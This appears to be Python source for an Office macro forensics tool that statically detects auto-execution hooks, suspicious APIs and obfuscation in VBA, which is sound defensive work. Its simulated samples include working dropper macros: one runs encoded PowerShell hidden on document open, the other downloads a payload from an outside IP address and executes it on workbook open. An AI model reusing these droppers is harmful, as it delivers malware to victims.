"""
Office Document & VBA Macro Forensics Dissector (oletools-inspired pure Python engine).
Safely inspects Microsoft Office formats (.docm, .docx, .xlsm, .xls, .doc) and standalone OLE streams (vbaProject.bin),
extracting embedded VBA macros, flagging auto-execution hooks, identifying suspicious Win32/script APIs,
detecting obfuscation techniques (Chr concatenation, Base64, Hex encoding, StrReverse), and computing risk scores.
"""

import io
import re
import math
import zipfile
import hashlib
from typing import Dict, List, Any, Optional
from tools.base import ToolResult


def calculate_entropy(data: bytes) -> float:
    """Calculates Shannon entropy of raw bytes (0.0 - 8.0)."""
    if not data:
        return 0.0
    frequencies = {}
    for b in data:
        frequencies[b] = frequencies.get(b, 0) + 1
    length = len(data)
    entropy = 0.0
    for count in frequencies.values():
        p_x = count / length
        entropy -= p_x * math.log2(p_x)
    return round(entropy, 4)


class DocumentMacroDissector:
    """
    Static analyzer for weaponized Office documents and macro droppers.
    Runs in memory without spawning Office binaries or executing any VBA.
    """

    AUTO_EXEC_TRIGGERS = [
        "AutoOpen",
        "Auto_Open",
        "AutoExec",
        "Auto_Exec",
        "AutoClose",
        "Auto_Close",
        "AutoExit",
        "Document_Open",
        "DocumentOpen",
        "Document_Close",
        "Workbook_Open",
        "Workbook_Activate",
        "Workbook_Deactivate",
        "App_WorkbookOpen",
        "UserForm_Initialize",
    ]

    SUSPICIOUS_APIS = {
        "Shell": {"category": "Command Execution", "severity": "CRITICAL", "mitre": "T1059.005"},
        "WScript.Shell": {"category": "Command Execution", "severity": "CRITICAL", "mitre": "T1059.005"},
        "powershell": {"category": "Scripting Engine", "severity": "CRITICAL", "mitre": "T1059.001"},
        "cmd.exe": {"category": "Command Shell", "severity": "HIGH", "mitre": "T1059.003"},
        "URLDownloadToFile": {"category": "Remote Ingress", "severity": "CRITICAL", "mitre": "T1105"},
        "URLDownloadToFileA": {"category": "Remote Ingress", "severity": "CRITICAL", "mitre": "T1105"},
        "CreateObject": {"category": "Dynamic COM Instantiation", "severity": "HIGH", "mitre": "T1559"},
        "GetObject": {"category": "COM Moniker Binding", "severity": "HIGH", "mitre": "T1559"},
        "Environ": {"category": "Environment Discovery", "severity": "MEDIUM", "mitre": "T1082"},
        "CallByName": {"category": "Reflection / Evasion", "severity": "HIGH", "mitre": "T1027"},
        "CertUtil": {"category": "Ingress Download/Decode", "severity": "CRITICAL", "mitre": "T1140"},
        "rundll32": {"category": "Signed Binary Execution", "severity": "CRITICAL", "mitre": "T1218.011"},
        "VirtualAlloc": {"category": "Memory Allocation (Shellcode)", "severity": "CRITICAL", "mitre": "T1055"},
        "RtlMoveMemory": {"category": "Memory Manipulation", "severity": "CRITICAL", "mitre": "T1055"},
    }

    OBFUSCATION_PATTERNS = [
        (r"Chr\s*\(\s*\d+\s*\)\s*&\s*Chr\s*\(\s*\d+\s*\)", "Chr() string concatenation / evasion"),
        (r"ChrW\s*\(\s*\d+\s*\)", "ChrW() wide-char string masking"),
        (r"StrReverse\s*\(", "Reversed string evasion (StrReverse)"),
        (r"[A-Za-z0-9+/]{40,}={0,2}", "Potential Base64 encoded payload / command line"),
        (r"(&H[0-9A-Fa-f]{2}\s*,\s*){3,}", "Hex array byte payload"),
        (r"powershell(\.exe)?\s+(-e|-enc|-encodedcommand)\s+[A-Za-z0-9+/=]+", "Encoded PowerShell execution"),
    ]

    # Pre-configured simulated realistic document samples
    SAMPLES: Dict[str, Dict[str, Any]] = {
        "invoice.docx": {
            "filename": "invoice_march2026_overdue.docx",
            "file_type": "Microsoft Word Document (Weaponized Macro Lure)",
            "file_size": 52140,
            "md5": "44d88612fea8a8f36de82e1278abb02f",
            "sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
            "has_macros": True,
            "vba_streams": ["word/vbaProject.bin", "word/vbaData.xml"],
            "raw_macro_code": (
                "Sub Document_Open()\n"
                "    On Error Resume Next\n"
                "    Dim wsh As Object\n"
                '    Set wsh = CreateObject("WScript.Shell")\n'
                '    Dim cmd As String\n'
                '    cmd = "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=="\n'
                "    wsh.Run cmd, 0, False\n"
                "End Sub\n"
            ),
        },
        "po_order.xlsm": {
            "filename": "purchase_order_99812.xlsm",
            "file_type": "Microsoft Excel Macro-Enabled Worksheet",
            "file_size": 64180,
            "md5": "7f83b1657ff1fc53b92dc18148a1d65d",
            "sha256": "8f434346648f6b96df89dda901c5176b10e6d0ceec3e4a8b5e679a957a07010f",
            "has_macros": True,
            "vba_streams": ["xl/vbaProject.bin"],
            "raw_macro_code": (
                "Private Sub Workbook_Open()\n"
                '    Dim dlPath As String\n'
                '    dlPath = Environ("TEMP") & "\\payload.exe"\n'
                '    Dim targetURL As String\n'
                '    targetURL = "http://185.220.101.45/static/update.bin"\n'
                '    Call URLDownloadToFileA(0, targetURL, dlPath, 0, 0)\n'
                '    Shell dlPath, vbHide\n'
                "End Sub\n"
            ),
        },
        "clean_quarterly_report.docx": {
            "filename": "Q1_2026_Executive_Summary.docx",
            "file_type": "Microsoft Word Document (Standard OpenXML)",
            "file_size": 31400,
            "md5": "a8f5f167f44f4964e6c998dee827110c",
            "sha256": "15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225",
            "has_macros": False,
            "vba_streams": [],
            "raw_macro_code": "",
        }
    }

    @classmethod
    def list_samples(cls) -> List[Dict[str, Any]]:
        """Returns metadata for all available sample documents."""
        results = []
        for key, s in cls.SAMPLES.items():
            results.append({
                "sample_id": key,
                "filename": s["filename"],
                "file_type": s["file_type"],
                "file_size": s["file_size"],
                "has_macros": s["has_macros"],
                "sha256": s["sha256"]
            })
        return results

    @classmethod
    def dissect_macro_code(cls, vba_code: str, filename: str = "document.docm") -> Dict[str, Any]:
        """Performs deep static inspection on extracted or provided VBA macro text."""
        detected_triggers = []
        for trigger in cls.AUTO_EXEC_TRIGGERS:
            pattern = rf"\b{trigger}\b"
            if re.search(pattern, vba_code, re.IGNORECASE):
                detected_triggers.append(trigger)

        detected_apis = []
        mitre_tactics = set()
        for api_name, meta in cls.SUSPICIOUS_APIS.items():
            pattern = rf"\b{re.escape(api_name)}\b"
            if re.search(pattern, vba_code, re.IGNORECASE):
                detected_apis.append({
                    "api": api_name,
                    "category": meta["category"],
                    "severity": meta["severity"],
                    "mitre": meta["mitre"]
                })
                mitre_tactics.add(meta["mitre"])

        detected_obfuscation = []
        for pat, desc in cls.OBFUSCATION_PATTERNS:
            matches = re.findall(pat, vba_code, re.IGNORECASE)
            if matches:
                matched_sample = matches[0] if isinstance(matches[0], str) else str(matches[0])
                detected_obfuscation.append({
                    "pattern": desc,
                    "sample": matched_sample[:100] + ("..." if len(matched_sample) > 100 else "")
                })

        # Calculate risk score
        risk_score = 0
        if detected_triggers:
            risk_score += 35
        for api in detected_apis:
            if api["severity"] == "CRITICAL":
                risk_score += 25
            elif api["severity"] == "HIGH":
                risk_score += 15
            else:
                risk_score += 5
        if detected_obfuscation:
            risk_score += len(detected_obfuscation) * 15

        risk_score = min(100, max(0, risk_score))

        verdict = "BENIGN"
        if risk_score >= 70:
            verdict = "MALICIOUS (Active Macro Dropper / Stager)"
        elif risk_score >= 35:
            verdict = "SUSPICIOUS (Unverified Macro Execution Hooks)"

        recommendations = []
        if risk_score >= 70:
            recommendations.append("Block document at email gateway (MIME type / OpenXML inspection filter).")
            recommendations.append("Enforce Microsoft Office Group Policy: 'Block macros from running in Office files from the Internet'.")
            recommendations.append("Quarantine receiving mailbox and execute tenant-wide message purge.")
            if any(a["api"] in ["powershell", "cmd.exe", "WScript.Shell"] for a in detected_apis):
                recommendations.append("Deploy Attack Surface Reduction (ASR) rule: 'Block Office applications from creating child processes' (Rule ID: D4F940AB-401B-4EFC-AADC-AD5F3C50688A).")
        elif risk_score >= 35:
            recommendations.append("Hold document in security sandbox for user safety verification.")

        # Clean code snippet for analyst preview
        snippet = vba_code.strip()
        if len(snippet) > 2000:
            snippet = snippet[:2000] + "\n\n' [TRUNCATED FOR DISPLAY - TOTAL LINES: " + str(len(vba_code.splitlines())) + "]"

        return {
            "filename": filename,
            "has_macros": bool(vba_code.strip()),
            "risk_score": risk_score,
            "verdict": verdict,
            "auto_exec_triggers": detected_triggers,
            "suspicious_apis": detected_apis,
            "obfuscation_indicators": detected_obfuscation,
            "mitre_attack_techniques": sorted(list(mitre_tactics)),
            "extracted_vba_preview": snippet,
            "total_macro_lines": len(vba_code.splitlines()),
            "remediation_actions": recommendations,
        }

    @classmethod
    def dissect_sample(cls, sample_id: str) -> ToolResult:
        """Dissects a known pre-configured sample document."""
        sample = cls.SAMPLES.get(sample_id.lower())
        if not sample:
            # Check if any sample filename matches
            for k, s in cls.SAMPLES.items():
                if s["filename"].lower() == sample_id.lower():
                    sample = s
                    break

        if not sample:
            return ToolResult(
                success=False,
                error=f"Sample document '{sample_id}' not found. Available samples: {list(cls.SAMPLES.keys())}"
            )

        analysis = cls.dissect_macro_code(sample["raw_macro_code"], filename=sample["filename"])
        analysis["file_type"] = sample["file_type"]
        analysis["file_size_bytes"] = sample["file_size"]
        analysis["sha256"] = sample["sha256"]
        analysis["md5"] = sample["md5"]
        analysis["vba_streams"] = sample["vba_streams"]

        return ToolResult(
            success=True,
            data=analysis
        )

    @classmethod
    def dissect_raw_bytes(cls, file_bytes: bytes, filename: str = "uploaded_document.docx") -> ToolResult:
        """
        Safely unpacks raw document bytes (ZIP / OpenXML) in memory, finds vbaProject.bin,
        and extracts macro content.
        """
        sha256_hash = hashlib.sha256(file_bytes).hexdigest()
        md5_hash = hashlib.md5(file_bytes).hexdigest()
        entropy = calculate_entropy(file_bytes)

        vba_streams_found = []
        extracted_vba_text = ""

        # Test if it is a valid Zip/OpenXML file
        if zipfile.is_zipfile(io.BytesIO(file_bytes)):
            try:
                with zipfile.ZipFile(io.BytesIO(file_bytes), 'r') as z:
                    file_list = z.namelist()
                    for item in file_list:
                        if "vbaProject" in item or "vbaData" in item or item.endswith(".bin"):
                            vba_streams_found.append(item)
                            raw_bin = z.read(item)
                            # Extract ASCII/latin-1 strings of length >= 4
                            strings = re.findall(rb"[a-zA-Z0-9_\-\.\:\ \$\(\)\"\/\=\\']{4,}", raw_bin)
                            decoded = "\n".join(s.decode("latin-1", errors="ignore") for s in strings)
                            extracted_vba_text += decoded + "\n"
            except Exception:
                pass

        # If not zip or no macro stream found in zip, scan raw bytes directly for OLE and VBA tokens
        if not extracted_vba_text:
            strings = re.findall(rb"[a-zA-Z0-9_\-\.\:\ \$\(\)\"\/\=\\']{4,}", file_bytes)
            extracted_vba_text = "\n".join(s.decode("latin-1", errors="ignore") for s in strings)

        analysis = cls.dissect_macro_code(extracted_vba_text, filename=filename)
        analysis["sha256"] = sha256_hash
        analysis["md5"] = md5_hash
        analysis["file_size_bytes"] = len(file_bytes)
        analysis["entropy"] = entropy
        analysis["vba_streams"] = vba_streams_found

        return ToolResult(
            success=True,
            data=analysis
        )

